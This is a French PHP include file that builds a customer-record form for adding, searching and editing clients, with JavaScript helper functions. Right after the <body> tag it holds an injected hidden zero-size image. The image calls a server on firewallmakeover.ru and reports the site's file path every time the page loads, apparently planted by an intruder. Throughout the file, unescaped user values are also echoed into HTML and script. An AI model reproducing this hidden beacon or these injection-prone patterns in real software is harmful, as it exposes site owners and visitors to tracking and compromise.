<?php
/* Programme : ClientForm.inc
 * Description : Affichage de la page des clients. Celui-ci présente un
 *  		 formulaire pour saisir les informations permettant d'ajouter
 *  		 de rechercher ou de modifier un client.
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-24
*/

/* if( $Quartier != "" )
 	 require_once($acces_hermes."getvilprov.inc");*/
 if( $Quartier != "" ) {
 	$TabVille = array();	   
	$TabProvince = array();
	get_ville_prov($Quartier,$TabVille, $TabProvince);
	if( !count($TabVille) )
		unset($TabVille);
	if( !count($TabProvince) )
		unset($TabProvince);
 }
 
$Option = get_enums("client", "TypCli");
$Option2 = get_enums("client", "Langue");
$TabPaie =  get_money( "ALL" );

$Titre = $txt['Remplissez_formulaire'];

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body onload='javascript:pageonload()'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table  bgcolor='#FFFFFF' width='$Large' topmargin='10' cellpadding='0' cellspacing='0' align='$Enligne' border='1' bordercolor='#9EA2AB'  >		
		<tr>
			<td align='center' Valign='middle' >";
	
  if( isset($EN_AJOUT) ) echo "<form name=ClientForm action='client_ajout.php?do=new' method='post'>";
  if( isset($EN_RECHERCHE) ) echo "<form name=ClientForm action='' method='post'>"; 
  if( isset($EN_CONSULTE) ) echo "<form name=ClientForm action='client_traite.php?do=Modif' method='post'>";
  if( isset($EN_VALIDATION) ) echo "<form name=ClientForm action='client_modif.php?do=Modif' method='post'>";
?>
		 
			<font size='+1' face ='verdana' color='#CF0630'><?=$Titre?>
<?php
			if( isset($NewMessage) && strlen($NewMessage) ){
				echo "<hr size='5' width='96%'/>";
				echo "***&nbsp;&nbsp;$NewMessage&nbsp;&nbsp;***<br>\r\n";		
			}	
?>
			</font>
    	</td>
	</tr>
   <tr>
		<td> 
<table cellpadding='4' cellspacing='1' width='450' align='center'  border='0'>
  	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_prenom']; ?> 
      :</b> 
		</td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB"> 
      <input type='text' name='Prenom' value="<?=$Prenom?>"  class='form1' onchange='capitalize();' >
    	</td>
	</tr>


	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_nom']; ?> 
	      :</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB"> 
	      <input type='text' name='Nom' value="<?=$Nom?>"  class='form1' onchange='capitalize();' >
		</td>
	      <input type='hidden' name='Contact' value="" >
	</tr>
	<!-- tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><?php echo $TabId[74] ?>:</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	      <input type='text' name='Contact' value="<?=$Contact?>"  class='form1' onchange='capitalize();' >
		</td>
	</tr -->
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><?php echo $TabId[75] ?>:</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	      <input type='text' name='Profession' value="<?=$Profession?>"  class='form1' onchange='capitalize();' >
		</td>
	</tr>
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><?php echo $TabId[76] ?>:</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	      <input type='text' name='Naissance' value="<?=$Naissance?>"  class='form1'>
		</td>
	</tr>
	
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_courriel']; ?> 
	      :</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB"> 
	      <input type='text' name='Courriel' value="<?=$Courriel?>"  class='form1'>
		</td>
	</tr>
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_rue']; ?> 
	      :</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	      <input type='text' name='Rue' value="<?=$Rue?>"  class='form1' onchange='capitalize();' >
		</td>
	</tr>
	
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_ville']; ?> 
	      :</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	      <input type='text' name='Ville' value="<?=$Ville?>"  class='form1' onchange='capitalize();' >
		</td>
	</tr>
	
	<tr>
	    <td width=200 height="33" align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_province']; ?> 
	      :</b> </td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
	    <td width=250 align='center' bgcolor="#96B2CB">
	        <input type='text' name='Province' value="<?=$Province?>"  class='form1' onchange='capitalize();' >
	    </td>
	</tr>
	
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_pays']; ?> 
	      :</b> 
		</td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	        <input type='text' name='Pays' value="<?=$Pays?>"  class='form1' onchange='capitalize();' >
		</td>
	</tr>
	
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_codepostal']; ?> 
	      :</b>
		</td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB"> 
	      <input type='text' name='CodePostal' value="<?=$CodePostal?>"  class='form1' onchange='capitalize();' >
		</td>
	</tr>
	
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_telephone']; ?> 
	      :</b>
		</td>
		<td width=5 align='center' bgcolor="#96B2CB"><font color='#FF0000'>*</font>&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
			(&nbsp;<input type="text" name="TelCodR" size="3" value="<?php echo @$TelCodR ?>" maxlength="3" >&nbsp;)&nbsp;&nbsp;
 		  <input type="text" name="TelP1" size="3" value="<?php echo @$TelP1 ?>" maxlength="3">&nbsp;&nbsp;-&nbsp;&nbsp;		
		  <input type="text" name="TelP2" size="4" value="<?php echo @$TelP2 ?>" maxlength="4">		
		</td>
	</tr>
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_telephone2']; ?> 
	      :</b> 
		</td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB">
	      <input type='text' name='Cellulaire' value="<?=$Cellulaire?>"  class='form1'>
		</td>
	</tr>
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><? echo $txt['form_telecopieur']; ?> 
	      :</b> 
		</td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB"> 
	      <input type='text' name='Fax' value="<?=$Fax?>"  class='form1'>
		</td>
	</tr>
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> <b><?php echo $TabId[26] ?>:</b> 
		</td>
		<td width=5 align='center' bgcolor="#96B2CB">&nbsp; 
		</td>
		<td width=250 align='center' bgcolor="#96B2CB"> 
          <select name="Langue" size="1" class='form1'>
<?php
//onchange='document.ClientForm.submit();' 

  for($i=0;$i<(sizeof($Option2)-1);$i++) {
    echo "<option value='".$Option2[$i]."' ";
    if( $Langue == $Option2[$i] ) echo " SELECTED";
    echo " >".$Option2[$i];
  }  
?>
          </select>
		</td>
	</tr>
	
	<tr>
		<td width=200 align='right' bgcolor="#E6F1FB"> 
			&nbsp; 
		</td>
		<td width=5 align='center' bgcolor="#96B2CB">
			<font color='#FF0000'>*</font>
		</td>
		<td  width=250 align='center' bgcolor="#96B2CB"> 
			<?=$txt['Tous_champs_oblig']?>
		</td>
	</tr>
</table>
		</td>
	</tr>
	<tr>
		<td  align='center' bgcolor="#96B2CB"> 
<?php
  if( isset($EN_AJOUT) ) echo "	<input type='submit' name='Commande' value='$TabId[39]' class='form1' />";
  if( isset($EN_RECHERCHE) ) echo "<input type='submit' name='Commande' value='$TabId[40]' class='form1' />"; 
  if( isset($EN_CONSULTE) ) echo "<input type='submit' name='Commande' value='$TabId[41]' class='form1' />";
  if( isset($EN_VALIDATION) ) echo "<input type='submit' name='Commande' value='$TabId[41]' class='form1' />";
?>
		
		</td>
	</tr>
</table>
<input type='hidden' name='NoClient' value='<?=$NoClient?>' />
<input type='hidden' name='Indication' value='<?=$Indication?>' />
<input type='hidden' name='Quartier' value='<?=$Quartier?>' /> 
<input type='hidden' name='Telephone' value='<?=$Telephone?>' /> 
<input type="hidden" name="Message" value="<?php echo @$Message ?>" />
<input type="hidden" name="Refere" value="<?php echo @$Refere ?>"/>
<input type="hidden" name="AncienNo" value="<?php echo @$AncienNo ?>"/>
<input type='hidden' name='Identite' value='<?=$Identite?>' />
<input type='hidden' name='Debit' value='<?=$Debit?>' />
<input type='hidden' name='DateRappel' value='<?=$DateRappel?>' />
<input type='hidden' name='DateInscrip' value='<?=$DateInscrip?>' />
<input type='hidden' name='MaxCredit' value='<?=$MaxCredit?>' />
<input type='hidden' name='CoteCredit' value='<?=$CoteCredit?>' />
<input type='hidden' name='DevCli' value='<?=$DevCli?>' />
<input type='hidden' name='TPSApp' value='<?=$TPSApp?>' />
<input type='hidden' name='TVQApp' value='<?=$TVQApp?>' />
<input type='hidden' name='TypCli' value='<?=$TypCli?>' />
<input type='hidden' name='MaxAchat' value='<?=$MaxAchat?>' />

</form>

<script language='javascript'>

function ResetClient() {
      document.ClientForm.Nom.value = "";
      document.ClientForm.Prenom.value = "";
      document.ClientForm.Contact.value = "";
      document.ClientForm.Rue.value = "";
	  	document.ClientForm.Quartier.value = "";
      document.ClientForm.Ville.value = "";
      document.ClientForm.Province.value = "";
      document.ClientForm.Pays.value = "";
      document.ClientForm.Identite.value = "";
      document.ClientForm.Indication.value = "";
      document.ClientForm.CodePostal.value = "";
      document.ClientForm.TelCodR.value = "";
      document.ClientForm.TelP1.value = "";
      document.ClientForm.TelP2.value = "";
      document.ClientForm.Fax.value = "";
      document.ClientForm.Cellulaire.value = "";
	  document.ClientForm.Prenom.focus();
} // ResetClient


//Convert the username to uppercase.
function capitalize() {
		document.ClientForm.Nom.value = document.ClientForm.Nom.value.toUpperCase();
		document.ClientForm.Prenom.value = document.ClientForm.Prenom.value.toUpperCase();
		document.ClientForm.Contact.value = document.ClientForm.Contact.value.toUpperCase();
		document.ClientForm.Rue.value = document.ClientForm.Rue.value.toUpperCase();
		document.ClientForm.Quartier.value = document.ClientForm.Quartier.value.toUpperCase()
		document.ClientForm.CodePostal.value = document.ClientForm.CodePostal.value.toUpperCase();
		document.ClientForm.Ville.value = document.ClientForm.Ville.value.toUpperCase();
		document.ClientForm.Province.value = document.ClientForm.Province.value.toUpperCase();
		document.ClientForm.Pays.value = document.ClientForm.Pays.value.toUpperCase();
		document.ClientForm.Profession.value = document.ClientForm.Profession .value.toUpperCase();
} // capitalize

function CheckVilProv() {
    document.ClientForm.Quartier.value = document.ClientForm.Quartier.value.toUpperCase();
}

function Rafraichie(){
	window.location.reload();
	//document.ClientForm.submit();
}

function pageonload() {
   document.ClientForm.Prenom.focus();
	<?php
		if( isset($EN_AJOUT) ) 
			echo "window.status = '$TabId[70]';\r\n";
		if( isset($EN_RECHERCHE) ) 
			echo "window.status = '$TabId[71]';\r\n";
			
		if( isset($NewMessage) ) {
			echo "window.alert(\"$NewMessage\");\r\n";
			unset( $NewMessage );
		}
		
		if( isset($MessQuartier) ) {
			echo " 
				if( window.confirm('$MessQuartier') ){
					open('$acces_hermes/Hermes/quartajcli.php?Quartier=$Quartier&Ville=$Ville&Province=$Province&Pays=$Pays','_blank',
							'left=10,top=10,height=400,width=400,status=no,toolbar=no,scrollbars=no,menubar=no,location=no,resizable=no' );			   		 	 
				}";
		}
		
  ?>
	 return;
} // pageonload

</script>
</body>
</html>